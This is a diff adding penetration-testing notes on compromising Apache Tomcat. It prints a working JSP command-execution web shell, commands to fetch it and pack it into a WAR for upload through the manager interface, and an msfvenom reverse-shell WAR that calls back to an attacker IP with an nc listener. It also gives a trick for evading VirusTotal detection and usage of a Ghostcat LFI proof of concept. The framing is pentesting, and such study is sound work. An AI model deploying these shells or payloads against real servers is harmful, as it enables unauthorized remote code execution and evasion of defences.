@@ -499,4 +499,85 @@ We can also use [this Python script](https://github.com/b33lz3bub-1/Tomcat-Manag
 python3 mgr_brute.py -U http://web01.company.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
+### Tomcat Manager - WAR File Upload
+Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. <br>
+A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive:
+```
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+```
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+```
+Click on `Browse` to select the .war file and then click on `Deploy`. This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table. If we click on backup, we will get redirected to `http://web01.company.local:8180/backup/` and get a 404 Not Found error. We need to specify the `cmd.jsp` file in the URL as well. Browsing to `http://web01.company.local:8180/backup/cmd.jsp`. We can also use curl:
+```
+curl http://web01.company.local:8180/backup/cmd.jsp?cmd=id
+```
+To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. <br>
 
+We could also use `msfvenom` to generate a malicious WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+```
+Then `Deploy`
+```
+nc -lnvp 4443
+```
+Finally visit `http://web01.company.local:8180/backup`.
+The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process. <br>
+[This JSP web shell](https://github.com/SecurityRiskAdvisors/cmd.jsp) is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. 
+A simple change in the code, such as changing this:
+```
+FileOutputStream(f);stream.write(m);o="Uploaded:
+```
+to this:
+```
+FileOutputStream(f);stream.write(m);o="uPlOaDeD:
+```
+Can results in 0 hits on VirusTotal.
+
+*Note: When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.*
+
+### CVE-2020-1938 : Ghostcat
+Unauthenticated LFI in all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.
+This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.
+The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.
+```
+nmap -sV -p 8009,8080 dev.company.local
+```
+The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). 
+```
+ python2.7 CNVD-2020-10487-Tomcat-Ajp-lfi.py dev.company.local -p 8009 -f WEB-INF/web.xml
+```
